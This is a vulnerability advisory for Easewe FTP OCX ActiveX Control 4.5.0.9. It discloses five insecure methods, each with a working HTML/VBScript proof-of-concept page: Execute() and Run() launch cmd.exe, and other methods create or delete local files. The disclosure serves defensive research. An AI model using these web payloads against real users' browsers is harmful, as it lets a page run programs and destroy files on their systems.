Vulnerability ID: HTB23015
Reference: http://www.htbridge.ch/advisory/easewe_ftp_ocx_activex_control_execute_insecure_method.html
Product: Easewe FTP OCX ActiveX Control
Vendor: Easewe Software ( http://www.ftpocx.com ) 
Vulnerable Version: 4.5.0.9 and probably prior
Tested on: 4.5.0.9
Vendor Notification: 01 June 2011 
Vulnerability Type: ActiveX Control Insecure Method
Risk level: High 
Credit: High-Tech Bridge SA Security Research Lab ( http://www.htbridge.ch/advisory/ ) 

Vulnerability Details:
High-Tech Bridge SA Security Research Lab has discovered multiple vulnerabilities in Easewe FTP OCX ActiveX Control, which can be exploited to potentially compromise a user's system.

1) The vulnerability is caused due to the EaseWeFtp.FtpLibrary ActiveX control (EaseWeFtp.ocx) including the insecure "Execute()" method. This can be exploited to execute arbitrary local files via specially crafted parameters passed to the affected method. 

The following PoC code is available:


<html>
<object classid='clsid:31AE647D-11D1-4E6A-BE2D-90157640019A' id='target' /></object>
<input language=VBScript onclick=Boom() type=button value="Exploit">
<script language = 'vbscript'>
Sub Boom()
  arg1="c:\windows\system32\cmd.exe"
  arg2=""
  arg3=1
  target.Execute arg1 ,arg2 ,arg3
End Sub
</script>
</html> 


2) The vulnerability is caused due to the EaseWeFtp.FtpLibrary ActiveX control (EaseWeFtp.ocx) including the insecure "Run()" method. This can be exploited to execute arbitrary local files via specially crafted parameters passed to the affected method. 

The following PoC code is available:


<html>
<object classid='clsid:31AE647D-11D1-4E6A-BE2D-90157640019A' id='target' /></object>
<input language=VBScript onclick=Boom() type=button value="Exploit">
<script language = 'vbscript'>
Sub Boom()
  arg1="c:\windows\system32\cmd.exe"
  arg2=""
  arg3=1
  target.Run arg1 ,arg2 ,arg3
End Sub
</script>
</html> 


3) The vulnerability is caused due to the EaseWeFtp.FtpLibrary ActiveX control (EaseWeFtp.ocx) including the insecure "CreateLocalFile()" method. This can be exploited to create empty files in the context of the current user. 

The following PoC code is available:


<html>
<object classid='clsid:31AE647D-11D1-4E6A-BE2D-90157640019A' id='target' /></object>
<input language=VBScript onclick=Boom() type=button value="Exploit">
<script language = 'vbscript'>

Sub Boom()
  arg1="FilePath\Filename_to_create"
  target.CreateLocalFile arg1
End Sub

</script>
</html> 


4) The vulnerability is caused due to the EaseWeFtp.FtpLibrary ActiveX control (EaseWeFtp.ocx) including the insecure "CreateLocalFolder()" method. This can be exploited to create arbitrary folders in the context of the current user. 

The following PoC code is available:


<html>
<object classid='clsid:31AE647D-11D1-4E6A-BE2D-90157640019A' id='target' /></object>
<input language=VBScript onclick=Boom() type=button value="Exploit">
<script language = 'vbscript'>

Sub Boom()
  arg1="Directorypath\Directory"
  target.CreateLocalFolder arg1
End Sub

</script>
</html> 


5) The vulnerability is caused due to the EaseWeFtp.FtpLibrary ActiveX control (EaseWeFtp.ocx) including the insecure "DeleteLocalFile()" method. This can be exploited delete files in the context of the current user.  

The following PoC code is available:


<html>
<object classid='clsid:31AE647D-11D1-4E6A-BE2D-90157640019A' id='target' /></object>
<input language=VBScript onclick=Boom() type=button value="Exploit">
<script language = 'vbscript'>

Sub Boom()
  arg1="FilePath\Filename_to_delete"
  target.DeleteLocalFile arg1
End Sub
</script>
</html> 


